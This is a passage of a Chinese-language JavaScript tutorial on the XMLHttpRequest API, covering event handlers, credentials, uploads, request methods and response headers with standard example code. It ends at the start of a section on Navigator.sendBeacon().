<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">xhr.onload &#x3D; function() &#123;</span><br><span class="line"> var responseText &#x3D; xhr.responseText;</span><br><span class="line"> console.log(responseText);</span><br><span class="line"> &#x2F;&#x2F; process the response.</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.onabort &#x3D; function () &#123;</span><br><span class="line">  console.log(&#39;The request was aborted&#39;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.onprogress &#x3D; function (event) &#123;</span><br><span class="line">  console.log(event.loaded);</span><br><span class="line">  console.log(event.total);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.onerror &#x3D; function() &#123;</span><br><span class="line">  console.log(&#39;There was an error!&#39;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>progress</code>事件的监听函数有一个事件对象参数，该对象有三个属性：<code>loaded</code>属性返回已经传输的数据量，<code>total</code>属性返回总的数据量，<code>lengthComputable</code>属性返回一个布尔值，表示加载的进度是否可以计算。所有这些监听函数里面，只有<code>progress</code>事件的监听函数有参数，其他函数都没有参数。</p>
<p>注意，如果发生网络错误（比如服务器无法连通），<code>onerror</code>事件无法获取报错信息。也就是说，可能没有错误对象，所以这样只能显示报错的提示。</p>
<h4 id="XMLHttpRequest-withCredentials"><a href="#XMLHttpRequest-withCredentials" class="headerlink" title="XMLHttpRequest.withCredentials"></a>XMLHttpRequest.withCredentials</h4><p><code>XMLHttpRequest.withCredentials</code>属性是一个布尔值，表示跨域请求时，用户信息（比如 Cookie 和认证的 HTTP 头信息）是否会包含在请求之中，默认为<code>false</code>，即向<code>example.com</code>发出跨域请求时，不会发送<code>example.com</code>设置在本机上的 Cookie（如果有的话）。</p>
<p>如果需要跨域 AJAX 请求发送 Cookie，需要<code>withCredentials</code>属性设为<code>true</code>。注意，同源的请求不需要设置这个属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;GET&#39;, &#39;http:&#x2F;&#x2F;example.com&#x2F;&#39;, true);</span><br><span class="line">xhr.withCredentials &#x3D; true;</span><br><span class="line">xhr.send(null);</span><br></pre></td></tr></table></figure>

<p>为了让这个属性生效，服务器必须显式返回<code>Access-Control-Allow-Credentials</code>这个头信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>

<p><code>withCredentials</code>属性打开的话，跨域请求不仅会发送 Cookie，还会设置远程主机指定的 Cookie。反之也成立，如果<code>withCredentials</code>属性没有打开，那么跨域的 AJAX 请求即使明确要求浏览器设置 Cookie，浏览器也会忽略。</p>
<p>注意，脚本总是遵守同源政策，无法从<code>document.cookie</code>或者 HTTP 回应的头信息之中，读取跨域的 Cookie，<code>withCredentials</code>属性不影响这一点。</p>
<h4 id="XMLHttpRequest-upload"><a href="#XMLHttpRequest-upload" class="headerlink" title="XMLHttpRequest.upload"></a>XMLHttpRequest.upload</h4><p>XMLHttpRequest 不仅可以发送请求，还可以发送文件，这就是 AJAX 文件上传。发送文件以后，通过<code>XMLHttpRequest.upload</code>属性可以得到一个对象，通过观察这个对象，可以得知上传的进展。主要方法就是监听这个对象的各种事件：loadstart、loadend、load、abort、error、progress、timeout。</p>
<p>假定网页上有一个<code>&lt;progress&gt;</code>元素。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;progress min&#x3D;&quot;0&quot; max&#x3D;&quot;100&quot; value&#x3D;&quot;0&quot;&gt;0% complete&lt;&#x2F;progress&gt;</span><br></pre></td></tr></table></figure>

<p>文件上传时，对<code>upload</code>属性指定<code>progress</code>事件的监听函数，即可获得上传的进度。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function upload(blobOrFile) &#123;</span><br><span class="line">  var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">  xhr.open(&#39;POST&#39;, &#39;&#x2F;server&#39;, true);</span><br><span class="line">  xhr.onload &#x3D; function (e) &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  var progressBar &#x3D; document.querySelector(&#39;progress&#39;);</span><br><span class="line">  xhr.upload.onprogress &#x3D; function (e) &#123;</span><br><span class="line">    if (e.lengthComputable) &#123;</span><br><span class="line">      progressBar.value &#x3D; (e.loaded &#x2F; e.total) * 100;</span><br><span class="line">      &#x2F;&#x2F; 兼容不支持 &lt;progress&gt; 元素的老式浏览器</span><br><span class="line">      progressBar.textContent &#x3D; progressBar.value;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  xhr.send(blobOrFile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">upload(new Blob([&#39;hello world&#39;], &#123;type: &#39;text&#x2F;plain&#39;&#125;));</span><br></pre></td></tr></table></figure>

<h3 id="XMLHttpRequest-的实例方法"><a href="#XMLHttpRequest-的实例方法" class="headerlink" title="XMLHttpRequest 的实例方法"></a>XMLHttpRequest 的实例方法</h3><h4 id="XMLHttpRequest-open"><a href="#XMLHttpRequest-open" class="headerlink" title="XMLHttpRequest.open()"></a>XMLHttpRequest.open()</h4><p><code>XMLHttpRequest.open()</code>方法用于指定 HTTP 请求的参数，或者说初始化 XMLHttpRequest 实例对象。它一共可以接受五个参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void open(</span><br><span class="line">   string method,</span><br><span class="line">   string url,</span><br><span class="line">   optional boolean async,</span><br><span class="line">   optional string user,</span><br><span class="line">   optional string password</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<ul>
<li><code>method</code>：表示 HTTP 动词方法，比如<code>GET</code>、<code>POST</code>、<code>PUT</code>、<code>DELETE</code>、<code>HEAD</code>等。</li>
<li><code>url</code>: 表示请求发送目标 URL。</li>
<li><code>async</code>: 布尔值，表示请求是否为异步，默认为<code>true</code>。如果设为<code>false</code>，则<code>send()</code>方法只有等到收到服务器返回了结果，才会进行下一步操作。该参数可选。由于同步 AJAX 请求会造成浏览器失去响应，许多浏览器已经禁止在主线程使用，只允许 Worker 里面使用。所以，这个参数轻易不应该设为<code>false</code>。</li>
<li><code>user</code>：表示用于认证的用户名，默认为空字符串。该参数可选。</li>
<li><code>password</code>：表示用于认证的密码，默认为空字符串。该参数可选。</li>
</ul>
<p>注意，如果对使用过<code>open()</code>方法的 AJAX 请求，再次使用这个方法，等同于调用<code>abort()</code>，即终止请求。</p>
<p>下面发送 POST 请求的例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;POST&#39;, encodeURI(&#39;someURL&#39;));</span><br></pre></td></tr></table></figure>

<h4 id="XMLHttpRequest-send"><a href="#XMLHttpRequest-send" class="headerlink" title="XMLHttpRequest.send()"></a>XMLHttpRequest.send()</h4><p><code>XMLHttpRequest.send()</code>方法用于实际发出 HTTP 请求。它的参数是可选的，如果不带参数，就表示 HTTP 请求只有一个 URL，没有数据体，典型例子就是 GET 请求；如果带有参数，就表示除了头信息，还带有包含具体数据的信息体，典型例子就是 POST 请求。</p>
<p>下面是 GET 请求的例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;GET&#39;,</span><br><span class="line">  &#39;http:&#x2F;&#x2F;www.example.com&#x2F;?id&#x3D;&#39; + encodeURIComponent(id),</span><br><span class="line">  true</span><br><span class="line">);</span><br><span class="line">xhr.send(null);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>GET</code>请求的参数，作为查询字符串附加在 URL 后面。</p>
<p>下面是发送 POST 请求的例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">var data &#x3D; &#39;email&#x3D;&#39;</span><br><span class="line">  + encodeURIComponent(email)</span><br><span class="line">  + &#39;&amp;password&#x3D;&#39;</span><br><span class="line">  + encodeURIComponent(password);</span><br><span class="line"></span><br><span class="line">xhr.open(&#39;POST&#39;, &#39;http:&#x2F;&#x2F;www.example.com&#39;, true);</span><br><span class="line">xhr.setRequestHeader(&#39;Content-Type&#39;, &#39;application&#x2F;x-www-form-urlencoded&#39;);</span><br><span class="line">xhr.send(data);</span><br></pre></td></tr></table></figure>

<p>注意，所有 XMLHttpRequest 的监听事件，都必须在<code>send()</code>方法调用之前设定。</p>
<p><code>send</code>方法的参数就是发送的数据。多种格式的数据，都可以作为它的参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void send();</span><br><span class="line">void send(ArrayBufferView data);</span><br><span class="line">void send(Blob data);</span><br><span class="line">void send(Document data);</span><br><span class="line">void send(String data);</span><br><span class="line">void send(FormData data);</span><br></pre></td></tr></table></figure>

<p>如果<code>send()</code>发送 DOM 对象，在发送之前，数据会先被串行化。如果发送二进制数据，最好是发送<code>ArrayBufferView</code>或<code>Blob</code>对象，这使得通过 Ajax 上传文件成为可能。</p>
<p>下面是发送表单数据的例子。<code>FormData</code>对象可以用于构造表单数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var formData &#x3D; new FormData();</span><br><span class="line"></span><br><span class="line">formData.append(&#39;username&#39;, &#39;张三&#39;);</span><br><span class="line">formData.append(&#39;email&#39;, &#39;zhangsan@example.com&#39;);</span><br><span class="line">formData.append(&#39;birthDate&#39;, 1940);</span><br><span class="line"></span><br><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;POST&#39;, &#39;&#x2F;register&#39;);</span><br><span class="line">xhr.send(formData);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>FormData</code>对象构造了表单数据，然后使用<code>send()</code>方法发送。它的效果与发送下面的表单数据是一样的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id&#x3D;&#39;registration&#39; name&#x3D;&#39;registration&#39; action&#x3D;&#39;&#x2F;register&#39;&gt;</span><br><span class="line">  &lt;input type&#x3D;&#39;text&#39; name&#x3D;&#39;username&#39; value&#x3D;&#39;张三&#39;&gt;</span><br><span class="line">  &lt;input type&#x3D;&#39;email&#39; name&#x3D;&#39;email&#39; value&#x3D;&#39;zhangsan@example.com&#39;&gt;</span><br><span class="line">  &lt;input type&#x3D;&#39;number&#39; name&#x3D;&#39;birthDate&#39; value&#x3D;&#39;1940&#39;&gt;</span><br><span class="line">  &lt;input type&#x3D;&#39;submit&#39; onclick&#x3D;&#39;return sendForm(this.form);&#39;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>下面的例子是使用<code>FormData</code>对象加工表单数据，然后再发送。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function sendForm(form) &#123;</span><br><span class="line">  var formData &#x3D; new FormData(form);</span><br><span class="line">  formData.append(&#39;csrf&#39;, &#39;e69a18d7db1286040586e6da1950128c&#39;);</span><br><span class="line"></span><br><span class="line">  var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">  xhr.open(&#39;POST&#39;, form.action, true);</span><br><span class="line">  xhr.onload &#x3D; function() &#123;</span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line">  &#125;;</span><br><span class="line">  xhr.send(formData);</span><br><span class="line"></span><br><span class="line">  return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var form &#x3D; document.querySelector(&#39;#registration&#39;);</span><br><span class="line">sendForm(form);</span><br></pre></td></tr></table></figure>

<h4 id="XMLHttpRequest-setRequestHeader"><a href="#XMLHttpRequest-setRequestHeader" class="headerlink" title="XMLHttpRequest.setRequestHeader()"></a>XMLHttpRequest.setRequestHeader()</h4><p><code>XMLHttpRequest.setRequestHeader()</code>方法用于设置浏览器发送的 HTTP 请求的头信息。该方法必须在<code>open()</code>之后、<code>send()</code>之前调用。如果该方法多次调用，设定同一个字段，则每一次调用的值会被合并成一个单一的值发送。</p>
<p>该方法接受两个参数。第一个参数是字符串，表示头信息的字段名，第二个参数是字段值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xhr.setRequestHeader(&#39;Content-Type&#39;, &#39;application&#x2F;json&#39;);</span><br><span class="line">xhr.setRequestHeader(&#39;Content-Length&#39;, JSON.stringify(data).length);</span><br><span class="line">xhr.send(JSON.stringify(data));</span><br></pre></td></tr></table></figure>

<p>上面代码首先设置头信息<code>Content-Type</code>，表示发送 JSON 格式的数据；然后设置<code>Content-Length</code>，表示数据长度；最后发送 JSON 数据。</p>
<h4 id="XMLHttpRequest-overrideMimeType"><a href="#XMLHttpRequest-overrideMimeType" class="headerlink" title="XMLHttpRequest.overrideMimeType()"></a>XMLHttpRequest.overrideMimeType()</h4><p><code>XMLHttpRequest.overrideMimeType()</code>方法用来指定 MIME 类型，覆盖服务器返回的真正的 MIME 类型，从而让浏览器进行不一样的处理。举例来说，服务器返回的数据类型是<code>text/xml</code>，由于种种原因浏览器解析不成功报错，这时就拿不到数据了。为了拿到原始数据，我们可以把 MIME 类型改成<code>text/plain</code>，这样浏览器就不会去自动解析，从而我们就可以拿到原始文本了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.overrideMimeType(&#39;text&#x2F;plain&#39;)</span><br></pre></td></tr></table></figure>

<p>注意，该方法必须在<code>send()</code>方法之前调用。</p>
<p>修改服务器返回的数据类型，不是正常情况下应该采取的方法。如果希望服务器返回指定的数据类型，可以用<code>responseType</code>属性告诉服务器，就像下面的例子。只有在服务器无法返回某种数据类型时，才使用<code>overrideMimeType()</code>方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.onload &#x3D; function(e) &#123;</span><br><span class="line">  var arraybuffer &#x3D; xhr.response;</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br><span class="line">xhr.open(&#39;GET&#39;, url);</span><br><span class="line">xhr.responseType &#x3D; &#39;arraybuffer&#39;;</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>

<h4 id="XMLHttpRequest-getResponseHeader"><a href="#XMLHttpRequest-getResponseHeader" class="headerlink" title="XMLHttpRequest.getResponseHeader()"></a>XMLHttpRequest.getResponseHeader()</h4><p><code>XMLHttpRequest.getResponseHeader()</code>方法返回 HTTP 头信息指定字段的值，如果还没有收到服务器回应或者指定字段不存在，返回<code>null</code>。该方法的参数不区分大小写。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function getHeaderTime() &#123;</span><br><span class="line">  console.log(this.getResponseHeader(&quot;Last-Modified&quot;));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;HEAD&#39;, &#39;yourpage.html&#39;);</span><br><span class="line">xhr.onload &#x3D; getHeaderTime;</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>

<p>如果有多个字段同名，它们的值会被连接为一个字符串，每个字段之间使用“逗号+空格”分隔。</p>
<h4 id="XMLHttpRequest-getAllResponseHeaders"><a href="#XMLHttpRequest-getAllResponseHeaders" class="headerlink" title="XMLHttpRequest.getAllResponseHeaders()"></a>XMLHttpRequest.getAllResponseHeaders()</h4><p><code>XMLHttpRequest.getAllResponseHeaders()</code>方法返回一个字符串，表示服务器发来的所有 HTTP 头信息。格式为字符串，每个头信息之间使用<code>CRLF</code>分隔（回车+换行），如果没有收到服务器回应，该属性为<code>null</code>。如果发生网络错误，该属性为空字符串。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;GET&#39;, &#39;foo.txt&#39;, true);</span><br><span class="line">xhr.send();</span><br><span class="line"></span><br><span class="line">xhr.onreadystatechange &#x3D; function () &#123;</span><br><span class="line">  if (this.readyState &#x3D;&#x3D;&#x3D; 4) &#123;</span><br><span class="line">    var headers &#x3D; xhr.getAllResponseHeaders();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码用于获取服务器返回的所有头信息。它可能是下面这样的字符串。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">date: Fri, 08 Dec 2017 21:04:30 GMT\r\n</span><br><span class="line">content-encoding: gzip\r\n</span><br><span class="line">x-content-type-options: nosniff\r\n</span><br><span class="line">server: meinheld&#x2F;0.6.1\r\n</span><br><span class="line">x-frame-options: DENY\r\n</span><br><span class="line">content-type: text&#x2F;html; charset&#x3D;utf-8\r\n</span><br><span class="line">connection: keep-alive\r\n</span><br><span class="line">strict-transport-security: max-age&#x3D;63072000\r\n</span><br><span class="line">vary: Cookie, Accept-Encoding\r\n</span><br><span class="line">content-length: 6502\r\n</span><br><span class="line">x-xss-protection: 1; mode&#x3D;block\r\n</span><br></pre></td></tr></table></figure>

<p>然后，对这个字符串进行处理。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var arr &#x3D; headers.trim().split(&#x2F;[\r\n]+&#x2F;);</span><br><span class="line">var headerMap &#x3D; &#123;&#125;;</span><br><span class="line"></span><br><span class="line">arr.forEach(function (line) &#123;</span><br><span class="line">  var parts &#x3D; line.split(&#39;: &#39;);</span><br><span class="line">  var header &#x3D; parts.shift();</span><br><span class="line">  var value &#x3D; parts.join(&#39;: &#39;);</span><br><span class="line">  headerMap[header] &#x3D; value;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">headerMap[&#39;content-length&#39;] &#x2F;&#x2F; &quot;6502&quot;</span><br></pre></td></tr></table></figure>

<h4 id="XMLHttpRequest-abort"><a href="#XMLHttpRequest-abort" class="headerlink" title="XMLHttpRequest.abort()"></a>XMLHttpRequest.abort()</h4><p><code>XMLHttpRequest.abort()</code>方法用来终止已经发出的 HTTP 请求。调用这个方法以后，<code>readyState</code>属性变为<code>4</code>，<code>status</code>属性变为<code>0</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;GET&#39;, &#39;http:&#x2F;&#x2F;www.example.com&#x2F;page.php&#39;, true);</span><br><span class="line">setTimeout(function () &#123;</span><br><span class="line">  if (xhr) &#123;</span><br><span class="line">    xhr.abort();</span><br><span class="line">    xhr &#x3D; null;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, 5000);</span><br></pre></td></tr></table></figure>

<p>上面代码在发出5秒之后，终止一个 AJAX 请求。</p>
<h3 id="XMLHttpRequest-实例的事件"><a href="#XMLHttpRequest-实例的事件" class="headerlink" title="XMLHttpRequest 实例的事件"></a>XMLHttpRequest 实例的事件</h3><h4 id="readyStateChange-事件"><a href="#readyStateChange-事件" class="headerlink" title="readyStateChange 事件"></a>readyStateChange 事件</h4><p><code>readyState</code>属性的值发生改变，就会触发 readyStateChange 事件。</p>
<p>我们可以通过<code>onReadyStateChange</code>属性，指定这个事件的监听函数，对不同状态进行不同处理。尤其是当状态变为<code>4</code>的时候，表示通信成功，这时回调函数就可以处理服务器传送回来的数据。</p>
<h4 id="progress-事件"><a href="#progress-事件" class="headerlink" title="progress 事件"></a>progress 事件</h4><p>上传文件时，XMLHttpRequest 实例对象本身和实例的<code>upload</code>属性，都有一个<code>progress</code>事件，会不断返回上传的进度。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">function updateProgress (oEvent) &#123;</span><br><span class="line">  if (oEvent.lengthComputable) &#123;</span><br><span class="line">    var percentComplete &#x3D; oEvent.loaded &#x2F; oEvent.total;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    console.log(&#39;无法计算进展&#39;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">xhr.addEventListener(&#39;progress&#39;, updateProgress);</span><br><span class="line"></span><br><span class="line">xhr.open();</span><br></pre></td></tr></table></figure>

<h4 id="load-事件、error-事件、abort-事件"><a href="#load-事件、error-事件、abort-事件" class="headerlink" title="load 事件、error 事件、abort 事件"></a>load 事件、error 事件、abort 事件</h4><p>load 事件表示服务器传来的数据接收完毕，error 事件表示请求出错，abort 事件表示请求被中断（比如用户取消请求）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">xhr.addEventListener(&#39;load&#39;, transferComplete);</span><br><span class="line">xhr.addEventListener(&#39;error&#39;, transferFailed);</span><br><span class="line">xhr.addEventListener(&#39;abort&#39;, transferCanceled);</span><br><span class="line"></span><br><span class="line">xhr.open();</span><br><span class="line"></span><br><span class="line">function transferComplete() &#123;</span><br><span class="line">  console.log(&#39;数据接收完毕&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function transferFailed() &#123;</span><br><span class="line">  console.log(&#39;数据接收出错&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function transferCanceled() &#123;</span><br><span class="line">  console.log(&#39;用户取消接收&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="loadend-事件"><a href="#loadend-事件" class="headerlink" title="loadend 事件"></a>loadend 事件</h4><p><code>abort</code>、<code>load</code>和<code>error</code>这三个事件，会伴随一个<code>loadend</code>事件，表示请求结束，但不知道其是否成功。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xhr.addEventListener(&#39;loadend&#39;, loadEnd);</span><br><span class="line"></span><br><span class="line">function loadEnd(e) &#123;</span><br><span class="line">  console.log(&#39;请求结束，状态未知&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="timeout-事件"><a href="#timeout-事件" class="headerlink" title="timeout 事件"></a>timeout 事件</h4><p>服务器超过指定时间还没有返回结果，就会触发 timeout 事件，具体的例子参见<code>timeout</code>属性一节。</p>
<h3 id="Navigator-sendBeacon-1"><a href="#Navigator-sendBeacon-1" class="headerlink" title="Navigator.sendBeacon()"></a>Navigator.sendBeacon()</h3><p>用户卸载网页的时候，有时需要向服务器发一些数据。很自然的做法是在<code>unload</code>事件或<code>beforeunload</code>事件的监听函数里面，使用<code>XMLHttpRequest</code>对象发送数据。但是，这样做不是很可靠，因为<code>XMLHttpRequest</code>对象是异步发送，很可能在它即将发送的时候，页面已经卸载了，从而导致发送取消或者发送失败。</p>
<p>解决方法就是<code>unload</code>事件里面，加一些很耗时的同步操作。这样就能留出足够的时间，保证异步 AJAX 能够发送成功。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function log() &#123;</span><br><span class="line">  let xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">  xhr.open(&#39;post&#39;, &#39;&#x2F;log&#39;, true);</span><br><span class="line">  xhr.setRequestHeader(&#39;Content-Type&#39;, &#39;application&#x2F;x-www-form-urlencoded&#39;);</span><br><span class="line">  xhr.send(&#39;foo&#x3D;bar&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">window.addEventListener(&#39;unload&#39;, function(event) &#123;</span><br><span class="line">  log();</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; a time-consuming operation</span><br><span class="line">  for (let i &#x3D; 1; i &lt; 10000; i++) &#123;</span><br><span class="line">    for (let m &#x3D; 1; m &lt; 10000; m++) &#123; continue; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>上面代码中，强制执行了一次双重循环，拖长了<code>unload</code>事件的执行时间，导致异步 AJAX 能够发送成功。</p>
<p>类似的还可以使用<code>setTimeout</code>。下面是追踪用户点击的例子。</p>
